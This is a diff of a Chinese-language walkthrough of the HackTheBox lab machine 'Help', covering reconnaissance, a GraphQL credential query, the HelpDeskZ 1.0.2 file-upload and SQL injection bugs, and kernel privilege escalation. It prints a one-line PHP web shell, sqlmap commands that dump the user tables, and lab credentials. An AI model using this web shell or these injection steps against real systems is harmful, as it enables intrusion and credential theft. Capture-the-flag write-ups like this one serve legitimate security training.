@@ -1,4 +1,4 @@
-# nmap 
+## nmap 
 
 ```
 PORT     STATE SERVICE VERSION
@@ -15,38 +15,51 @@ PORT     STATE SERVICE VERSION
 
 ```
 
-# dirsearch
+## dirsearch
 
 ### 80端口
 
-扫目录先扫到http://10.10.10.121/support，继续扫扫到下面这些目录，在readme中找到版本号为1.0.2
+![image-20250325215039367](Help/image-20250325215039367.png)
 
-```
-[16:57:41] 200 -  378B  - /support/.gitattributes                           
-[16:59:14] 200 -    1KB - /support/favicon.ico                              
-[16:59:25] 200 -    0B  - /support/images/
-[16:59:34] 200 -    7KB - /support/LICENSE.txt                              
-[17:00:08] 200 -    3KB - /support/README.md                                
-[17:00:08] 200 -    3KB - /support/readme.html 
-```
+扫目录先扫到http://10.10.10.121/support，继续扫扫到下面这些目录，
 
-该版本存在SQL注入和任意文件上传
+![image-20250325215054785](Help/image-20250325215054785.png)
+
+在readme中找到版本号为1.0.2
+
+![image-20250325215213772](Help/image-20250325215213772.png)
+
+该版本存在[SQL注入和任意文件上传](https://www.exploit-db.com/exploits/41200)
 
 sql注入需要登录
 
-### 查看3000端口
+## 3000端口
 
 查看响应头服务器正在运行express框架
 
 搜到express js query language可以查到graphql
 
-使用graphql语法查询即可得到username和password
+![image-20250325220155752](Help/image-20250325220155752.png)
+
+![image-20250325220215164](Help/image-20250325220215164.png)
+
+graphql查询语法[Pwning WordPress GraphQL |渗透测试合作伙伴 --- Pwning WordPress GraphQL | Pen Test Partners](https://www.pentestpartners.com/security-blog/pwning-wordpress-graphql/)
+
+查询有哪些schema
+
+```
+http://help.htb:3000/graphql?query={%20__schema{queryType{name,fields{name,description}}}}
+```
+
+![image-20250325222021292](Help/image-20250325222021292.png)
+
+然后查询username和password
 
 ```
 http://10.10.10.121:3000/graphql?query={user{username,password}}
 ```
 
-
+![image-20250325223025651](Help/image-20250325223025651.png)
 
 ```
 username	"helpme@helpme.com"
@@ -57,9 +70,69 @@ password	"5d3c93182bb20f07b994a7f617e99cff"
 helpme@helpme.com：godhelpmeplz
 ```
 
+然后使用该账号密码即可登录
+
+## 突破点
+
+上面查询到helpdeskz 1.0.2存在文件上传漏洞和sql注入漏洞，分别都尝试一下
+
+### 文件上传漏洞
+
+漏洞原理，上传之后的文件名命名时会以当前时间戳的MD5值增加扩展之后进行命名，所以存在爆破的可能性[爆破脚本](https://github.com/b4rt00/helpdeskz-1.0.2-file_upload)
+
+```
+$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
+```
+
+上传一句话木马
+
+```
+<?php @system($__GET[cmd]);?>
+```
+
+![image-20250325230535303](Help/image-20250325230535303.png)
+
+![image-20250325230552221](Help/image-20250325230552221.png)
+
+然后反弹shell
+
+![image-20250325231940266](Help/image-20250325231940266.png)
+
+![image-20250325231953338](Help/image-20250325231953338.png)
+
 ### sql注入
 
-登录后进行ticket上传，注入点就在上传的文件下载的路径的param[]参数
+[HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download - PHP webapps Exploit](https://www.exploit-db.com/exploits/41200)
+
+![image-20250325232802730](Help/image-20250325232802730.png)
+
+注入点就在上传文件之后，文件下载的url中，注入参数为param[]
+
+使用sqlmap爆出用户名和密码
+
+```
+sqlmap -r sql1 -p param[] --batch --dbs
+```
+
+![image-20250325233139257](Help/image-20250325233139257.png)
+
+```
+sqlmap -r sql1 -p param[] --batch -D support --tables --threads 10
+```
+
+![image-20250325234108983](Help/image-20250325234108983.png)
+
+```
+sqlmap -r sql1 -p param[] --batch -D support -T users --columns --threads 10
+```
+
+![image-20250325234205817](Help/image-20250325234205817.png)
+
+```
+sqlmap -r sql1 -p param[] --batch -D support -T staff -C username,password --threads 10 --dump
+```
+
+![image-20250325235115941](Help/image-20250325235115941.png)
 
 sql注入得到admin密码
 
@@ -67,6 +140,18 @@ sql注入得到admin密码
 admin：Welcome1
 ```
 
-ssh连接尝试多个用户名，最后help成功登录，
+ssh连接尝试多个用户名，最后help用户成功登录，
 
 该版本存在内核漏洞，内核提权即可
+
+## 提权
+
+该版本存在内核提取漏洞
+
+![image-20250325233659741](Help/image-20250325233659741.png)
+
+![image-20250325233654056](Help/image-20250325233654056.png)
+
+本地下载之后上传到靶机，靶机编译之后运行即可
+
+![image-20250325234013436](Help/image-20250325234013436.png)
